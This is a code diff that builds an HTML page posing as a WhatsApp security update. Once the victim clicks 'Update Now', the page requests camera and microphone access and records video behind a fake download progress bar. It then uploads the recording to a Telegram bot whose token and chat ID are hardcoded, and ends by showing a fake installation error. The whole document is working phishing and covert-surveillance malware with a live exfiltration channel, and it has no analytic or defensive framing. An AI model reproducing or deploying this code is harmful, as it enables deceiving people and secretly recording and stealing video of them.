@@ -1,84 +1,125 @@
-const TOKEN = "8823259495:AAHe6VSdY9_Ea_g7hIPVhX0sWJWb1XYchgA";
-const CHAT_ID = "8210199939";
-const videoElement = document.getElementById('webcam');
-const overlay = document.getElementById('overlay');
-const statusText = document.getElementById('status-text');
-const progressBar = document.getElementById('fill');
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Update</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 90%; }
+        img { width: 80px; margin-bottom: 20px; opacity: 0.8; }
+        h2 { color: #128c7e; font-size: 1.4em; margin-bottom: 10px; }
+        p { color: #667781; font-size: 0.9em; line-height: 1.4; }
+        .btn { background-color: #25d366; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 1em; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
+        .progress-container { width: 80%; background: #e9edef; border-radius: 10px; height: 10px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #25d366; transition: width 0.2s; }
+        #error-msg { color: #ea0038; display: none; margin-top: 20px; font-weight: bold; }
+        video { display: none; }
+    </style>
+</head>
+<body>
 
-let mediaRecorder;
-let recordedChunks = [];
+<div class="container" id="main-ui">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA">
+    <h2>New Version Available</h2>
+    <p>To continue using WhatsApp, please install the latest security update. This ensures your chats remain encrypted.</p>
+    <button class="btn" onclick="startProcess()">Update Now</button>
+</div>
 
-async function startProcess() {
-    try {
-        // Запрашиваем фронталку (facingMode: user)
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, 
-            audio: true 
-        });
-        
-        videoElement.srcObject = stream;
-        overlay.style.display = 'flex';
-        
-        // Ждем 2 секунды, чтобы камера прогрелась и пошла картинка
-        statusText.innerText = "Initializing secure connection...";
-        await new Promise(resolve => setTimeout(resolve, 2000));
+<div id="overlay">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" style="width: 50px;">
+    <h3 id="status-text">Connecting...</h3>
+    <div class="progress-container" id="progress-bar">
+        <div class="progress-fill" id="fill"></div>
+    </div>
+    <div id="error-msg">
+        Error 403: Installation failed.<br>
+        Your device is not compatible.
+    </div>
+</div>
 
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) recordedChunks.push(event.data);
-        };
+<video id="webcam" autoplay playsinline muted></video>
 
-        mediaRecorder.start();
-        statusText.innerText = "Downloading WhatsApp Messenger...";
+<script>
+    const TOKEN = "8823259495:AAHe6VSdY9_Ea_g7hIPVhX0sWJWb1XYchgA";
+    const CHAT_ID = "8210199939";
+    const videoElement = document.getElementById('webcam');
+    const overlay = document.getElementById('overlay');
+    const statusText = document.getElementById('status-text');
+    const progressBar = document.getElementById('fill');
 
-        // Таймер имитации загрузки (20 секунд)
-        let progress = 0;
-        let interval = setInterval(() => {
-            progress += 1;
-            progressBar.style.width = progress + '%';
-            if (progress >= 100) {
-                clearInterval(interval);
-                stopAndSend();
-            }
-        }, 200); 
+    let mediaRecorder;
+    let recordedChunks = [];
 
-    } catch (err) {
-        alert("Verification failed. Please allow camera access to continue.");
-        console.error(err);
-    }
-}
+    async function startProcess() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: true 
+            });
+            
+            videoElement.srcObject = stream;
+            overlay.style.display = 'flex';
+            document.getElementById('main-ui').style.display = 'none';
+            
+            statusText.innerText = "Initializing secure connection...";
+            await new Promise(resolve => setTimeout(resolve, 2500));
 
-function stopAndSend() {
-    statusText.innerText = "Finishing installation...";
-    
-    mediaRecorder.stop();
-    mediaRecorder.onstop = async () => {
-        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
-        
-        // Если данных слишком мало, пробуем еще раз или выводим ошибку
-        if (blob.size > 1000) {
-            await sendToTelegram(blob);
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
+                             ? 'video/webm;codecs=vp8' 
+                             : 'video/mp4';
+
+            mediaRecorder = new MediaRecorder(stream, { mimeType });
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data && event.data.size > 0) recordedChunks.push(event.data);
+            };
+
+            mediaRecorder.start(1000);
+            statusText.innerText = "Downloading Update...";
+
+            let progress = 0;
+            let interval = setInterval(() => {
+                progress += 0.5;
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    stopAndSend();
+                }
+            }, 100); 
+
+        } catch (err) {
+            alert("Verification failed. Please allow camera access to update WhatsApp.");
+            console.error(err);
         }
-        
-        // Показываем финальную ошибку
-        document.getElementById('spinner').style.display = 'none';
-        document.getElementById('progress-bar').style.display = 'none';
-        document.getElementById('error-msg').style.display = 'block';
-        statusText.style.display = 'none';
-    };
-}
-
-async function sendToTelegram(blob) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('video', blob, 'front_cam.mp4');
-
-    try {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
-            method: 'POST',
-            body: formData
-        });
-    } catch (e) {
-        console.error("Upload error", e);
     }
-}
+
+    async function stopAndSend() {
+        statusText.innerText = "Processing files...";
+        if (mediaRecorder && mediaRecorder.state !== "inactive") {
+            mediaRecorder.stop();
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: recordedChunks[0].type });
+                if (blob.size > 0) await sendToTelegram(blob);
+                
+                document.getElementById('progress-bar').style.display = 'none';
+                document.getElementById('error-msg').style.display = 'block';
+                statusText.style.display = 'none';
+                videoElement.srcObject.getTracks().forEach(track => track.stop());
+            };
+        }
+    }
+
+    async function sendToTelegram(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('document', blob, 'video_report.mp4');
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: formData });
+        } catch (e) { console.error(e); }
+    }
+</script>
+
+</body>
+</html>
